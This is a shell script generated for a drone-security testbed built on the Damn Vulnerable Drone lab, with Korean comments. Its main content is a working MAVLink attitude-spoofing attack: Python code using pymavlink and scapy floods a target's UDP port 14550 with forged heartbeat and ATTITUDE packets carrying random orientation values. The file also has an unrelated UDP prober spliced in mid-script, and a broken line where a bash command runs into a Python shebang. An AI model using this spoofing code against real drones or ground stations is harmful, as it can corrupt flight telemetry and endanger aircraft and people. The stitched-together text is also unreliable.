#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Attitude-Spoofing.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../..")

# --- Python Module Path FIX ---
# 파이썬이 우리 모듈을 찾을 수 있도록 프로젝트 루트를 PYTHONPATH에 추가합니다.
export PYTHONPATH="${PROJECT_ROOT}:${PYTHONPATH}"

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
# MTD 인터페이스 모듈 직접 실행
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo "$TARGET_ADDR" | cut -d: -f1)
TARGET_PORT=14550 # SITL의 기본 UDP 포트

# 중앙 로거 함수 정의
log() {
    printf '[%(%F_T)T] %s\n' -1 "$*"
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c 'from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; import sys; log_bus_event(sys.argv[1], {"message": sys.argv[2]})' "$EVENT_TYPE" "$EVENT_DATA_STR"
    popd > /dev/null
}
# MTD_INTERFACE_END
set -euo pipefail#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import json
import os
import socket
import sys
import time
from typing import Tuple

# ── 프로젝트 루트 경로 및 버스 로거 import ─────────────────────────────────────
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if PROJECT_ROOT not in sys.path:
    sys.path.append(PROJECT_ROOT)

try:
    from bus.logger import log_bus_event
except Exception:
    def log_bus_event(event_type, data):
        print(json.dumps({"type": event_type, "data": data, "ts": time.time()}), flush=True)

DEFAULT_STATE = os.path.join(PROJECT_ROOT, "mtd", "shared_state", "mtd_state.json")

def read_target(state_file: str) -> Tuple[str, int]:
    try:
        with open(state_file, "r", encoding="utf-8") as f:
            st = json.load(f)
        cur = st.get("current_target") or "10.13.0.3:14550"
        ip, port = cur.split(":")[0], int(cur.split(":")[1])
        return ip, port
    except Exception:
        return "10.13.0.3", 14550

def send_udp_probe(dst_ip: str, dst_port: int, payload: bytes = b"PROBE", bind_ip: str = "") -> Tuple[str, int]:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.2)
    try:
        if bind_ip:
            s.bind((bind_ip, 0))
        s.connect((dst_ip, dst_port))
        s.send(payload)
        src_ip, src_port = s.getsockname()
        return src_ip, src_port
    except Exception:
        try:
            src_ip, src_port = s.getsockname()
        except Exception:
            src_ip, src_port = "0.0.0.0", 0
        return src_ip, src_port
    finally:
        s.close()

def main():
    p = argparse.ArgumentParser(description="Lightweight UDP prober that logs hits to bus.log")
    p.add_argument("--interval", type=float, default=1.0, help="probe 주기(초)")
    p.add_argument("--state-file", type=str, default=DEFAULT_STATE, help="mtd_state.json 경로")
    p.add_argument("--bind-ip", type=str, default="", help="지정 시 해당 소스 IP로 UDP 바인드")
    p.add_argument("--payload", type=str, default="PROBE", help="보낼 페이로드(문자열)")
    args = p.parse_args()

    print(f"[PROBER] start | state_file={args.state_file} | interval={args.interval:.1f}s")
    last_ip, last_port = None, None

    while True:
        dst_ip, dst_port = read_target(args.state_file)
        if (dst_ip, dst_port) != (last_ip, last_port):
            print(f"[PROBER] target -> {dst_ip}:{dst_port}")
            log_bus_event("prober_target_changed", {"target": f"{dst_ip}:{dst_port}"})
            last_ip, last_port = dst_ip, dst_port

        src_ip, src_port = send_udp_probe(dst_ip, dst_port, args.payload.encode("utf-8"), bind_ip=args.bind_ip)
        print(f"[PROBER] hit -> {src_ip}:{src_port} => {dst_ip}:{dst_port}")

        # orchestrator 게이트가 인식하는 표준 UDP 이벤트
        log_bus_event("udp_packet", {
            "proto": "UDP",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port
        })

        time.sleep(args.interval)

if __name__ == "__main__":
    main()


# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=attitude-spoofing src=Attitude-Spoofing.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=random.uniform(-1.0, 1.0),
        pitch=random.uniform(-1.0, 1.0),
        yaw=random.uniform(-3.14, 3.14),
        rollspeed=random.uniform(-0.1, 0.1),
        pitchspeed=random.uniform(-0.1, 0.1),
        yawspeed=random.uniform(-0.1, 0.1)
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attitude-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_attitude(), target_ip, target_port)
        print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
PY

log "[BLOCK 2] type=shell"
sudo python3 attitude-spoofing.py ${TARGET_IP}:14550

